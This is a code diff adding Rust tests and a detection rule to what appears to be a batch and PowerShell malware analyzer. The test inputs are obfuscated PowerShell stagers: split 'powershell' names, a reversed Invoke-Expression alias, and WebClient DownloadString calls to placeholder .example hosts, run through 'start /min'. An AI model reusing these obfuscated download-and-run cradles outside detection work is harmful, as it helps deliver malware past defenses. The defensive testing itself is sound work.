@@ -12728,6 +12728,87 @@ mod embedded_powershell_invocation_gate_tests {
     }
 
     #[test]
+    fn start_wrapper_queues_positional_powershell_payload() {
+        let line = "start /min powershell $parts='https','://start-wrapper.example/stage.ps1';$url=$parts -join '';(New-Object Net.WebClient).DownloadString($url)";
+        let mut env = Environment::new(&Config::default());
+
+        scan_embedded_powershell_invocations(line, &mut env);
+
+        assert!(
+            env.exec_ps1
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload).contains("start-wrapper.example")),
+            "start-wrapped positional PowerShell was not queued: {:?}",
+            env.exec_ps1
+        );
+    }
+
+    #[test]
+    fn batch_start_wrapper_retains_expanded_positional_powershell_payload() {
+        let script = b"@echo off\r\nset engine=powershell\r\nset payload=$parts='https','://start-batch.example/stage.ps1';$url=$parts -join '';(New-Object Net.WebClient).DownloadString($url)\r\nstart /min %engine% %payload%\r\n";
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload).contains("start-batch.example")),
+            "expanded start-wrapped PowerShell was not retained: {:?}",
+            report.extracted_ps1
+        );
+    }
+
+    #[test]
+    fn batch_start_wrapper_retains_adjacent_expanded_powershell_fragments() {
+        let script = br#"@echo off
+set engine=pAoAwAeArAsAhAeAlAl
+set engine=%engine:A=%
+set message=$parts='https','://start-fragments.example/stage.ps1';
+set message2=$url=$parts -join '';
+set message3=(New-Object Net.WebClient).DownloadString($url)
+start /min %engine% %message%%message2%%message3%
+"#;
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload).contains("start-fragments.example")),
+            "adjacent start-wrapped PowerShell fragments were not retained: {:?}",
+            report.extracted_ps1
+        );
+    }
+
+    #[test]
+    fn batch_start_wrapper_retains_split_alias_powershell_stager() {
+        let script = br#"@echo off
+set rt0=pAoAwAeArAsAhAeAlAl
+set rt0=%rt0:A=%
+Set message=$rt='x','e','I';[Array]::Reverse($rt);sal z ($rt -join '');$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType
+set message2=], 3072);[System.Net.ServicePointManager]::SecurityProto
+set message3=col = $t56fg;$tpg='[void','] [Syst','em.Refle','ction.Asse','mbly]::LoadWi','thParti
+set message4=alName(''Microsoft.VisualBasic'')';z($tpg -join '');
+set message5=$tty55='(New-','Obje','ct Ne','t.We','bCli','ent)';$tty=z($tty55 -join '');$tt
+set message6=y;$rot='Down','load','str','ing';$rotJ=($rot -join '');$bnt='https','://start-alias.example/G19.txt';$bng0=($bnt -join '');$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,$rotJ,[Microsoft.VisualBasic.CallType]::Method,$bng0);z($mv)
+start /min %rt0% %message%%message2%%message3%%message4%%message5%%message6%
+"#;
+
+        let report = crate::analyze(script, &Config::default());
+
+        assert!(
+            report
+                .extracted_ps1
+                .iter()
+                .any(|payload| String::from_utf8_lossy(payload).contains("start-alias.example")),
+            "split alias PowerShell stager was not retained: {:?}",
+            report.extracted_ps1
+        );
+    }
+
+    #[test]
     fn blocks_pwsh_inside_encoded_token() {
         assert!(!has_embedded_powershell_invocation_atom(
             "set X=abcPWSHdef123"
@@ -12806,6 +12887,9 @@ fn looks_like_embedded_powershell_payload(tail: &str) -> bool {
     contains_ascii_case_insensitive(tail, "frombase64string")
         || contains_ascii_case_insensitive(tail, "http://")
         || contains_ascii_case_insensitive(tail, "https://")
+        || (contains_ascii_case_insensitive(tail, "-join")
+            && contains_ascii_case_insensitive(tail, "callbyname")
+            && tail.contains('$'))
         || looks_like_embedded_powershell_skip_nth_body(tail)
 }
 
